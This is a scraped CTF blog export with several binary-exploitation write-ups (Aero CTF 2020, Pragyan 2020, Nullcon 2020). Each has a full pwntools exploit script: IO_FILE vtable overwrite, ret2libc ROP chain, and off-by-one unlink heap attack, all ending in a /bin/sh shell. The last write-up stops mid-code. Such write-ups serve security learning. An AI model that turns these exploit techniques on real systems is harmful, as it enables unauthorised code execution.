a lot of things in memory, instead we can change the vtable pointer to IO_helper_jumps. And yes vtables are writeable again in libc-2.29 for some reason:Here is the call of IO_OVERFLOW at _IO_new_file_xsputn:12345678910111213141516171819size_t_IO_new_file_xsputn (FILE *f, const void *data, size_t n)&#123; const char *s = (const char *) data; size_t to_do = n; int must_flush = 0; size_t count = 0; ... truncated ... if (to_do + must_flush &gt; 0) &#123; size_t block_size, do_write; /* Next flush the (full) buffer. */ if (_IO_OVERFLOW (f, EOF) == EOF) // We want to get control of this /* If nothing else has to be written we must not signal the caller that everything has been written. */ return to_do == 0 ? EOF : n - to_do; ... truncated ... return n - to_do;&#125; The python line to edit the -2 index aka stdout:12345change_plane_name(-2, p64(0xfbad1800)+3*p64(0))LEAK = u64(r.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))LIBC = LEAK-0x1bc570log.info('LEAK 0x%x'% LEAK)log.info('LIBC 0x%x'% LIBC) If we leak with success we start building stdout overflow: 123456789101112131415161718192021222324252627282930313233_IO_2_1_stdout_ = '/bin/sh\\x00'# flags_IO_2_1_stdout_ += 3*p64(0) # _IO_read_ptr,_IO_read_end,_IO_read_base_IO_2_1_stdout_ += p64((LIBC+0x1e57e3) &amp; 0xffffffffff00) # _IO_write_base_IO_2_1_stdout_ += p64(LIBC+0x1e57e3) # _IO_write_ptr_IO_2_1_stdout_ += p64(LIBC+0x1e57e3) # _IO_write_end_IO_2_1_stdout_ += p64(LIBC+0x1e57e3) # _IO_buf_base_IO_2_1_stdout_ += p64(LIBC+0x1e57e3+1) # _IO_buf_end_IO_2_1_stdout_ += p64(0)*4_IO_2_1_stdout_ += p64(LIBC+libc.symbols['_IO_2_1_stdin_']) # _chain_IO_2_1_stdout_ += p32(0x1) # _fileno_IO_2_1_stdout_ += p32(0x0) # _flags2_IO_2_1_stdout_ += p64(-0x1, signed=True) #_old_offset_IO_2_1_stdout_ += p16(0x0) # _cur_column_IO_2_1_stdout_ += p8(0x0) # _vtable_offset_IO_2_1_stdout_ += p8(0x0) # _shortbuf_IO_2_1_stdout_ += p32(0x0) # _shortbuf_IO_2_1_stdout_ += p64(LIBC+libc.symbols['_IO_2_1_stdout_']+0x1e20) # _LOCK_IO_2_1_stdout_ += p64(-0x1, signed=True) # _offset_IO_2_1_stdout_ += p64(0x0) # _codecvt_IO_2_1_stdout_ += p64(LIBC+libc.symbols['_IO_2_1_stdout_']-0xea0) # _wide_data_IO_2_1_stdout_ += p64(0x0) # _freeres_list_IO_2_1_stdout_ += p64(0x0) # _freeres_buf_IO_2_1_stdout_ += p64(0x0) # __pad5_IO_2_1_stdout_ += p32(-0x1, signed=True) # _mode_IO_2_1_stdout_ += p32(0x0) # _unused2_IO_2_1_stdout_ += p64(0x0) # _unused2_IO_2_1_stdout_ += p64(0x0) # _unused2_IO_2_1_stdout_ += p64(LIBC+libc.symbols['_IO_2_1_stdout_']+0x200) # IO_helper_jumpsSTDERR = p64(LIBC+libc.symbols['_IO_2_1_stderr_']) # stderrSTDOUT = p64(LIBC+libc.symbols['_IO_2_1_stdout_']) # stdoutSTDIN = p64(LIBC+libc.symbols['_IO_2_1_stdin_']) # stdinINPUT = _IO_2_1_stdout_+STDERR+STDIN+STDOUT+p64(0)*2*17+p64(0)+p64(LIBC+0x80650)+p64(LIBC+libc.symbols['system'])change_plane_name(-2, INPUT, False) After this we can get a shell pops the full exploit: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115from pwn import *host, port = \"tasks.aeroctf.com\", \"33087\"filename = \"./plane_marketbkup\"#filename = \"./plane_market\"elf = ELF(filename)context.arch = 'amd64'#if not args.REMOTE:# libc = elf.libc#else:libc = ELF('./libc.so.6')def getConn(): return process(filename, env=&#123;\"LD_PRELOAD\":\"./libc.so.6\"&#125;) if not args.REMOTE else remote(host, port) #return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp): script = \"\" PIE = get_PIE(r) for x in bp: script += \"b *0x%x\\n\"%(x) gdb.attach(r,gdbscript=script)def add(psize,name,cost,yn, size=0, comm=\"\"): r.sendlineafter('&gt; ', '1') r.sendlineafter('Enter name size: ',str(psize)) r.sendlineafter('Enter plane name: ',name) r.sendlineafter('Enter plane cost: ',str(cost)) r.sendlineafter('Do you wanna leave a comment? [Y\\\\N]: ',yn) if yn == 'Y': r.sendlineafter('Enter comment size: ', str(size)) r.sendlineafter('Comment: ',comm)def free(pid): r.sendlineafter('&gt; ', '2') r.sendlineafter('Enter plane id: ',str(pid))def view_list(): r.sendlineafter('&gt; ', '3')def view_plane(pid): r.sendlineafter('&gt; ', '4') r.sendlineafter('Enter plane id: ', str(pid))def change_plane_name(pid, name, nl=True): r.sendlineafter('&gt; ', '5') r.sendlineafter('Enter plane id: ', str(pid)) if nl: r.sendlineafter('Enter new plane name: ', name) else: r.sendafter('Enter new plane name: ', name)context.terminal = ['tmux', 'new-window']#for i in range(0x1000):def exploit(): global r try: r = getConn() if not args.REMOTE and args.GDB: debug([0x401363,0x4013ED,0x401bc7,0x40139F])#0x40145C,0x40148C,0x4011EC]) r.sendlineafter('Enter name: ','%x') change_plane_name(-2, p64(0xfbad1800)+3*p64(0)) #context.log_level='debug' LEAK = u64(r.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) LIBC = LEAK-0x1bc570 log.info('LEAK 0x%x'% LEAK) log.info('LIBC 0x%x'% LIBC) _IO_2_1_stdout_ = '/bin/sh\\x00'#p64(0xfbad1800) _IO_2_1_stdout_ += 3*p64(0) _IO_2_1_stdout_ += p64((LIBC+0x1e57e3) &amp; 0xffffffffff00) # _IO_write_base _IO_2_1_stdout_ += p64(LIBC+0x1e57e3) # _IO_write_ptr _IO_2_1_stdout_ += p64(LIBC+0x1e57e3) # _IO_write_end _IO_2_1_stdout_ += p64(LIBC+0x1e57e3) # _IO_buf_base _IO_2_1_stdout_ += p64(LIBC+0x1e57e3+1) # _IO_buf_end _IO_2_1_stdout_ += p64(0)*4 _IO_2_1_stdout_ += p64(LIBC+libc.symbols['_IO_2_1_stdin_']) # _chain _IO_2_1_stdout_ += p32(0x1) # _fileno _IO_2_1_stdout_ += p32(0x0) # _flags2 _IO_2_1_stdout_ += p64(-0x1, signed=True) #_old_offset _IO_2_1_stdout_ += p16(0x0) # _cur_column _IO_2_1_stdout_ += p8(0x0) # _vtable_offset _IO_2_1_stdout_ += p8(0x0) # _shortbuf _IO_2_1_stdout_ += p32(0x0) # _shortbuf _IO_2_1_stdout_ += p64(LIBC+libc.symbols['_IO_2_1_stdout_']+0x1e20) # _LOCK _IO_2_1_stdout_ += p64(-0x1, signed=True) # _offset _IO_2_1_stdout_ += p64(0x0) # _codecvt _IO_2_1_stdout_ += p64(LIBC+libc.symbols['_IO_2_1_stdout_']-0xea0) # _wide_data _IO_2_1_stdout_ += p64(0x0) # _freeres_list _IO_2_1_stdout_ += p64(0x0) # _freeres_buf _IO_2_1_stdout_ += p64(0x0) # __pad5 _IO_2_1_stdout_ += p32(-0x1, signed=True) # _mode _IO_2_1_stdout_ += p32(0x0) # _unused2 _IO_2_1_stdout_ += p64(0x0) # _unused2 _IO_2_1_stdout_ += p64(0x0) # _unused2 _IO_2_1_stdout_ += p64(LIBC+libc.symbols['_IO_2_1_stdout_']+0x200) # IO_helper_jumps STDERR = p64(LIBC+libc.symbols['_IO_2_1_stderr_']) # stderr STDOUT = p64(LIBC+libc.symbols['_IO_2_1_stdout_']) # stdout STDIN = p64(LIBC+libc.symbols['_IO_2_1_stdin_']) # stdin INPUT = _IO_2_1_stdout_+STDERR+STDIN+STDOUT+p64(0)*2*17+p64(0)+p64(LIBC+0x80650)+p64(LIBC+libc.symbols['system']) change_plane_name(-2, INPUT, False) r.interactive() r.close() return True except EOFError: r.close() return Falsewhile not exploit(): pass References https://vigneshsrao.github.io/babytcache/ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Glibc Malloc","slug":"Pwn/x64/Glibc-Malloc","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"},{"name":"IO_FILE","slug":"Pwn/x64/Glibc-Malloc/IO-FILE","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/IO-FILE/"}],"tags":[{"name":"file_stream","slug":"file-stream","permalink":"https://teamrocketist.github.io/tags/file-stream/"},{"name":"io_file","slug":"io-file","permalink":"https://teamrocketist.github.io/tags/io-file/"},{"name":"io_file_struct","slug":"io-file-struct","permalink":"https://teamrocketist.github.io/tags/io-file-struct/"},{"name":"aero2020","slug":"aero2020","permalink":"https://teamrocketist.github.io/tags/aero2020/"}]},{"title":"[Pwn] Pragyan 2020 - Hide and Seek","slug":"Pwn-Pragyan-2020-Hide-and-Seek","date":"2020-02-24T19:32:05.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2020/02/24/Pwn-Pragyan-2020-Hide-and-Seek/","link":"","permalink":"https://teamrocketist.github.io/2020/02/24/Pwn-Pragyan-2020-Hide-and-Seek/","excerpt":"","text":"Hide and Seek Description:150pts Solvers 11 Little Joe is lonely and has no one to play with him. So, his father built him a toy that can play hide and seek with him. However, Little Joe has lost his toy! Can you help him find it? First solvers: OpenToAll gps 1760946c1646ecf61192e545c2e9ac4alibc-2.27.so 50390b2ae8aaa73c47745040f54e602fnc ctf.pragyan.org 17000 IntroThis challenge had a very few solves, maybe because most people gave up after the hack. Another reason is probably because when trying to get a shell with system on the server it returns segmentation fault due to an alignment problem, this is an issue I also had in a previous ctf (CSAW 2019) and the fix is pretty simple as I will explain bellow. Extracting infoEverything is enabled besides the stack canary:1234567$ checksec gpsu[*] '/ctf/work/pwn/hideandseek/gpsu' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled From the file command we know that the binary is dynamically linked so we know it’s going to use a shared library of libc. 12$ file gpsugpsu: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2b53545d7df75c5dd56122820cf4806f2be749d3, for GNU/Linux 3.2.0, not stripped VulnerabilityThere is an obvious buffer overflow vulnerability in scanf, we also partially got a leak of the PIE address, which is necessary if we want to leak addresses from the GOT and to build a ropchain: Writing the exploitFirst thing we want to do is to get the pie address some numbers from it we already know because they’re not affected by the ALSR: 10xXXXXXXXX?000 The ones we already know is the last 3 which is 3 zeros, the “Xs” are leaked from the binary from those printfs but we are missing one number which is denoted with a “?”. The solution to this is to brute-force this number, a 4 bit bruteforce shouldn’t take much time even when connecting remotely. So to form the pie address we can do this in python: 12345678addr = '0xXXXXXXXX4000' # 8 bit brute-force (random guess of \"?\" with the number 4)addr = list(addr)indexes = [2,4,6,8,3,5,7,9]for i in indexes: r.recvuntil('|') addr[i]=r.recv(1).decode() r.recvuntil('|') PIE = int(''.join(addr),16) To brute-force every try we need to put this in a loop until we get the right address, if we succeed we can leak a libc address from the GOT: 12345ROP_CHAIN = p64(POPRDI) # pop rdi ; retROP_CHAIN += p64(PIE+elf.got['fgets']) # fgets@gotROP_CHAIN += p64(PIE+0x10e0) # r2 -&gt; ?v sym.imp.putsROP_CHAIN += p64(MAIN) # return to main r.sendlineafter('---\\n', b'A'*38+ROP_CHAIN) The author didn’t release any libc file, because of this I used a very nice tool, from the leaked address, we can use the find command to get the right libc version: 123456789$ /libc-database/find fgets 0x7f0916d25b20http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb (id libc6_2.27-3ubuntu1_amd64)$ /libc-database/download libc6_2.27-3ubuntu1_amd64Getting libc6_2.27-3ubuntu1_amd64 -&gt; Location: http://mirrors.kernel.org/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb -&gt; Downloading package -&gt; Extracting package -&gt; Package saved to libs/libc6_2.27-3ubuntu1_amd64$ cp /libc-database/libs/libc6_2.27-3ubuntu1_amd64/libc-2.27.so . Next thing to do is to calculate the offsets: 123456FGETS = u64(r.recvuntil('\\x7f').ljust(8,b'\\x00'))LIBC = FGETS-libc.symbols['fgets']SYSTEM = LIBC+libc.symbols['system']BINSH = LIBC+next(libc.search(b'/bin/sh\\x00'))log.info('FGETS 0x%x', FGETS)log.info('LIBC 0x%x', LIBC) Now its time to build a ropchain that executes system(“/bin/sh\\x00”);, this is probably where most people got stuck, if we build a ropchain like this: 12345ROP_CHAIN = p64(POPRDI) # pop rdi ; retROP_CHAIN += p64(BINSH)ROP_CHAIN += p64(SYSTEM) # system(rdi=&amp;/bin/sh);ROP_CHAIN += p64(MAIN)r.sendlineafter('---\\n', b'A'*38+ROP_CHAIN) Locally everything runs smoothly but when running at the server it always segfaults , basically our payload needs to be aligned within a 16 byte multiple, so to fix the alignment on the remote machine we can just add another rop instruction ret between BINSH and SYSTEM which in the end doesn’t do anything but will fix the alignment on the server machine: 123456ROP_CHAIN = p64(POPRDI) # pop rdi ; retROP_CHAIN += p64(BINSH)ROP_CHAIN += p64(RET) # ret Won't work on server without thisROP_CHAIN += p64(SYSTEM) # system(rdi=&amp;/bin/sh);ROP_CHAIN += p64(MAIN)r.sendlineafter('---\\n', b'A'*38+ROP_CHAIN) With this we can get a shell remotely: 1234567891011121314151617181920[+] Opening connection to ctf.pragyan.org on port 17000: Done[*] 0x55df3d9c4000...[+] Opening connection to ctf.pragyan.org on port 17000: Done[*] 0x556cd8114000[*] FGETS 0x7f9e7ed7bb20[*] LIBC 0x7f9e7ecfd000[*] Switching to interactive mode|5| |6| |d| |1|--- --- --- --- YOU ARE HERE O --- --- --- ---|5| |c| |8| |1|--- --- --- ---$ cat bin/flag.txtp_ctf&#123;M@p_SPac3s_h3lP_pe0pl3_N@viG@t3&#125;$ iduid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) The full exploit: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778from pwn import *host, port = \"ctf.pragyan.org\", \"17000\"filename = \"./gpsu\"elf = ELF(filename)context.arch = 'amd64'if not args.REMOTE: libc = elf.libcelse: libc = ELF('./libc-2.27.so')def getConn(): return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"r\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp): script = \"\" PIE = get_PIE(r) PAPA = PIE for x in bp: script += \"b *0x%x\\n\"%(PIE+x) gdb.attach(r,gdbscript=script)context.terminal = ['tmux', 'new-window']def exploit(): global r try: r = getConn() if not args.REMOTE and args.GDB: debug([0x143b]) # 0x131a addr = '0xXXXXXXXX4000' # 4 bit bruteforce addr = list(addr) indexes = [2,4,6,8,3,5,7,9] for i in indexes: r.recvuntil('|') addr[i]=r.recv(1).decode() r.recvuntil('|') PIE = int(''.join(addr),16) RET = PIE+0x000000000000101a # ret POPRDI = PIE+0x00000000000014d3 # pop rdi ; ret MAIN = PIE+0x143c log.info('0x%x'% PIE) ROP_CHAIN = p64(POPRDI) ROP_CHAIN += p64(PIE+elf.got['fgets']) ROP_CHAIN += p64(PIE+0x10e0) # r2 -&gt; ?v sym.imp.puts ROP_CHAIN += p64(MAIN) #context.log_level = 'debug' r.sendlineafter('---\\n', b'A'*38+ROP_CHAIN) FGETS = u64(r.recvuntil('\\x7f').ljust(8,b'\\x00')) LIBC = FGETS-libc.symbols['fgets'] SYSTEM = LIBC+libc.symbols['system'] BINSH = LIBC+next(libc.search(b'/bin/sh\\x00')) log.info('FGETS 0x%x', FGETS) log.info('LIBC 0x%x', LIBC) ROP_CHAIN = p64(POPRDI) ROP_CHAIN += p64(BINSH) ROP_CHAIN += p64(RET) # Won't work on server without this ROP_CHAIN += p64(SYSTEM) ROP_CHAIN += p64(MAIN) r.sendlineafter('---\\n', b'A'*38+ROP_CHAIN) r.interactive() r.close() return True except EOFError: r.close() return Falsewhile not exploit(): pass","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"rop","slug":"rop","permalink":"https://teamrocketist.github.io/tags/rop/"},{"name":"ret2libc","slug":"ret2libc","permalink":"https://teamrocketist.github.io/tags/ret2libc/"},{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"}]},{"title":"[Pwn] Nullcon 2020 - DarkHonya","slug":"Pwn-Nullcon-2020-DarkHonya","date":"2020-02-09T17:14:55.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2020/02/09/Pwn-Nullcon-2020-DarkHonya/","link":"","permalink":"https://teamrocketist.github.io/2020/02/09/Pwn-Nullcon-2020-DarkHonya/","excerpt":"","text":"Description:437 Points nc pwn2.ctf.nullcon.net 5002 challenge 5b2f9b7d0b20ae7a694ae61c9de0c204 libc-2.23.so 8c0d248ea33e6ef17b759fa5d81dda9e TLDR Use off by one vulnerability to set next chunk prev_on_use bit to zero Use unlink attack to write a global addr to the global pointer list Edit global pointer list with exit_got and atoi_got Use edit to overwrite atoi_got with printf Use format string to leak libc Edit exit_got with onegadget Basic information123456789$ file challengechallenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ea21ef679ff8d18a6bb9d2dc8914f2689871e20, stripped$ checksec challenge[*] '/ctf/work/pwn/darkHonya/challenge' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) As you can see, the program is 64-bit, Canary and Pie off, writeable GOT and NX is enabled. Basic functionsThere are 4 functions in the program. After some static analysis, the functions can be analysed as follows: Name: Insert a name, data is stored in a global variable12345678int insertNameBss_4009FD()&#123; puts(\"----- BookStore -----\"); puts(\"finally! a customer, what is your name?\"); editString_400830(byte_6020A0); puts(byte_6020A0); return printf(\"Welcome %s\\n\", byte_6020A0);&#125; Buy book: Allocates a chunk of size 0xF8, and records the corresponding chunk pointer in the bss segment (ptr list).123456789101112131415int buyAbook_40087C()&#123; int result; // eax char *v1; // [rsp+0h] [rbp-10h] int i; // [rsp+Ch] [rbp-4h] for ( i = 0; ptr[i]; ++i ); if ( i &gt; 15 ) return puts(\"Next time bring a bag with you!\"); v1 = (char *)malloc(0xF8uLL); puts(\"Name of the book?\"); editString_400830(v1); result = i; ptr[i] = v1; return result;&#125; Return a book: releases the allocated memory block according to the specified index.1234567891011121314__int64 freeBook_40093A()&#123; __int64 result; // rax unsigned int v1; // [rsp+Ch] [rbp-4h] puts(\"Which book do you want to return?\"); v1 = getInt_4007ED(); if ( v1 &gt; 0xF ) puts(\"boy, you cannot return what you dont have!\"); free(ptr[v1]); result = v1; ptr[v1] = 0LL; return result;&#125; Edit a book: Read data into the allocated memory according to the specified index and there is a null byte overflow situation here.12345678910int __fastcall edit_4008EC(__int64 a1)&#123; unsigned int v2; // [rsp+Ch] [rbp-4h] v2 = getInt_4007ED(); if ( v2 &gt; 0xF ) return puts(\"Writing in the air now?\"); puts(\"Name of the book?\"); return (unsigned __int64)editString_400830((char *)ptr[v2]);&#125; The usual print function is not available. Basic planSince the program itself has no print function, in order to get libc, our primary purpose is to construct a leak first. The basic idea is as follows: Use unlink to modify ptr[0] to &amp;ptr[0]-0x18 Use editing function to edit(0) and overflow ptr[1] to exit@got and ptr[2] to atoi@got Use edit(2) to modify atoi@got to printf Use format-string to leak a libc addr from the stack Use edit(1) to modify exit@got to one_gadget Off by one (null byte poisoning)Now the idea with the null byte overflow is to set the prev_in_use bit of chunk B to zero, this bit is used to determine if the previous chunk is freed, if we free chunk B the free function is going to try to unlink chunk A, because it thinks its freed and present in doubly linked list, what defines the prev and next items in the list are the bk and fd pointers. Understanding unlinkTo understand well the unlink macro we need to understand its operations, the source code of unlink: 12345678910111213141516171819202122232425262728293031#define unlink(AV, P, BK, FD) &#123; FD = P-&gt;fd; BK = P-&gt;bk; if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); else &#123; FD-&gt;bk = BK; // arbitrary write happens here BK-&gt;fd = FD; // arbitrary write happens here if (!in_smallbin_range (P-&gt;size) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list (not small)\", P, AV); if (FD-&gt;fd_nextsize == NULL) &#123; if (P-&gt;fd_nextsize == P) FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; else &#123; FD-&gt;fd_nextsize = P-&gt;fd_nextsize; FD-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;fd_nextsize-&gt;bk_nextsize = FD; P-&gt;bk_nextsize-&gt;fd_nextsize = FD; &#125; &#125; else &#123; P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; &#125; &#125; &#125; &#125; The operations of FD-&gt;bk = BK and BK-&gt;fd = FD is what we want to achieve. Now taking a simple example, imagine we have 3 chunks. Starting with FD = P-&gt;fd and BK = P-&gt;bk: We execute the FD-&gt;bk=BK operation:And finally the BK-&gt;fd=FD operation:But there is a security check to bypass: 123// fd bkif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); We can’t directly use this to modify for example a GOT entry but we can bypass this mechanism in a fake way. First, we overwrite the FD pointer of nextchunk to fakeFD and the BK pointer of nextchunk to fakeBK, so in order to pass the verification we need: fakeFD-&gt;bk == P &lt;=&gt; *(fakeFD+0x18) == P fakeBK-&gt;fd == p &lt;=&gt; *(fakeBK+0x10) == P When the two above restrictions are satisfied, you can enter unlink and perform the following operations: fakeFD-&gt;bk = fakeBK &lt;=&gt; *(fakeFD + 0x18) = fakeBK fakeBK-&gt;fd = fakeFD &lt;=&gt; *(fakeBK + 0x10) = fakeFD Since this fakeFD-&gt;bk and fakeBK-&gt;fd must contain the address of P we need to find a place where the address of P is located and this place is at ptr list. If we can change one of the pointers stored in the ptr list to a pointer located in the bss segment, we will be able to edit the entire list, after that, we just change the values in that list to write wherever we want. Creating the exploitFirst we create a chunk A and a chunk B, inside of chunk A we create a fake chunk with size of 0xf1 set chunk B prev_size equal to 0xf0. 123add('A'*8)add('B'*8)edit(0,p64(0)+p64(0xf1)+p64(fakefd)+p64(fakebk)+'B'*0xd0 +p64(0xf0)) # create a fake chunk and overwrite prev_in_use Before the null byte overflow:After the null byte overflow:The prev_size value is to bypass this security check:12if ( __builtin_expect ( chunksize ( P ) ! = prev_size ( next_chunk ( P )), 0 )) malloc_printerr ( \"corrupted size vs. prev_size\" ); We can check the first security check of FD-&gt;bk != P || BK-&gt;fd != P by doing this in gdb:Lets trigger unlink by freeing chunk B: 1free(1) The content of global ptr will look like this:Now we add got pointers to the list: 1edit(0, p64(0x0)*3 + p64(0x602188) + p64(elf.got['exit']) + p64(elf.got['atoi']) + p64(0x602188)) Overwriting atoi@got at index 2 with printf: 1edit(2, p64(elf.plt['printf'])) Now that atoi@got points to printf it no longer converts the input string to integers but we can still use printf to select the menu options because the return value of printf is the number of bytes printed: 1234567r.sendline(' ') # 2 bytes sent so the option selected is 2 which is freer.sendline('%lx') # leak libc with format stringr.recvuntil('Which book do you want to return?\\n')LEAK = int(r.recvline().rstrip(),16)LIBC = LEAK -0x3c4963log.info('LEAK 0x%x'%LEAK)log.info('LIBC_BASE 0x%x'%LIBC) Finally we edit exit@got with onegadget and we get a shell: 1234r.sendlineafter('5) Checkout!\\n',' '*2)r.sendline('') # send 1 byte to select edit optionr.sendafter('Name of the book?\\n', p64(LIBC+0x4526a)) #overwrite exit@gotr.sendline('loool') # trigger exit aka one_gadget The full exploit: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778from pwn import *host, port = \"pwn2.ctf.nullcon.net\", \"5002\"filename = \"./challenge\"elf = ELF(filename)context.arch = 'amd64'if not args.REMOTE: libc = elf.libcelse: libc = ELF('./libc-2.23.so')GLOBAL = 0x6020A0ptr = 0x6021A0fakefd = ptr - 0x18fakebk = ptr - 0x10def getConn(): return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp): script = \"\" PIE = get_PIE(r) PAPA = PIE for x in bp: script += \"b *0x%x\\n\"%(x) gdb.attach(r,gdbscript=script)def add(name): r.sendlineafter('5) Checkout!\\n', '1') r.sendafter('Name of the book?\\n', name)def free(index): r.sendlineafter('5) Checkout!\\n', '2') r.sendlineafter('Which book do you want to return?\\n', str(index)) def edit(index, name): r.sendlineafter('5) Checkout!\\n', '3') r.sendline(str(index)) r.sendafter('Name of the book?\\n', name)context.terminal = ['tmux', 'new-window']r = getConn()#r.interactive()r.sendafter('finally! a customer, what is your name?\\n', 'A'*0xf8)add('A'*8)add('B'*8)#add('C'*8)if not args.REMOTE and args.GDB: debug([0x400877]) # 0x400977,0x4008ECedit(0,p64(0)+p64(0xf1)+p64(fakefd)+p64(fakebk)+'B'*0xd0 +p64(0xf0))free(1)#add('B'*8)edit(0, p64(0x0)*3 + p64(0x602188) + p64(elf.got['exit']) + p64(elf.got['atoi']) + p64(0x602188))edit(2, p64(elf.plt['printf']))r.sendline(' ')r.sendline('%lx')r.recvuntil('Which book do you want to return?\\n')LEAK = int(r.recvline().rstrip(),16)LIBC = LEAK -0x3c4963log.info('LEAK 0x%x'%LEAK)log.info('LIBC_BASE 0x%x'%LIBC)r.sendlineafter('5) Checkout!\\n',' '*2)r.sendline('')r.sendafter('Name of the book?\\n', p64(LIBC+0x4526a))r.sendline('loool')#r.sendlineafter('5) Checkout!\\n', '3')#free(1)#add('C'*8)r.interactive()r.close() References https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one/","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Glibc Malloc","slug":"Pwn/x64/Glibc-Malloc","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"},{"name":"Off By One","slug":"Pwn/x64/Glibc-Malloc/Off-By-One","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Off-By-One/"},{"name":"Unlink","slug":"Pwn/x64/Glibc-Malloc/Unlink","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Unlink/"}],"tags":[{"name":"unlink","slug":"unlink","permalink":"https://teamrocketist.github.io/tags/unlink/"},{"name":"offbyone","slug":"offbyone","permalink":"https://teamrocketist.github.io/tags/offbyone/"},{"name":"nullcon2020","slug":"nullcon2020","permalink":"https://teamrocketist.github.io/tags/nullcon2020/"}]},{"title":"[Pwn] Nullcon 2020 - Kidpwn","slug":"Pwn-Nullcon-2020-Kidpwn","date":"2020-02-09T10:28:39.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2020/02/09/Pwn-Nullcon-2020-Kidpwn/","link":"","permalink":"https://teamrocketist.github.io/2020/02/09/Pwn-Nullcon-2020-Kidpwn/","excerpt":"","text":"Description:437 Points nc pwn2.ctf.nullcon.net 5003 challenge f115365f85409565c4bdf94690434aae libc-2.23.so 8c0d248ea33e6ef17b759fa5d81dda9e TLDR Leak libc and pie addresses with format string Overflow the last byte of ret addr and jump to another position in _libc_main to return to main Change exit got with one gadget using format string Binary security and architecture1234567$ checksec challenge[*] '/ctf/work/pwn/kidpwn/challenge' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled No canary protection in this executable, relro is partial meaning we can overwrite the global offset table also we have another issue PIE is enabled. 12$ file challengechallenge: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=286d2ceaa8091a1b44bb0dcaf214d76c1d40bfee, stripped Libc is a shared library (dynamically linked) and the architecture is x86-64. Static analysisAnalysing the main we know we have a very simple program, it reads an integer from the input and creates a buffer in the stack using alloca, then it reads input from the stdin and stores it in this new created buffer then it prints it using printf.1234567891011121314151617181920212223242526272829303132__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; void *v4; // rsp char s; // [rsp+0h] [rbp-70h] char v6; // [rsp+Fh] [rbp-61h] unsigned __int16 v7; // [rsp+6Eh] [rbp-2h] 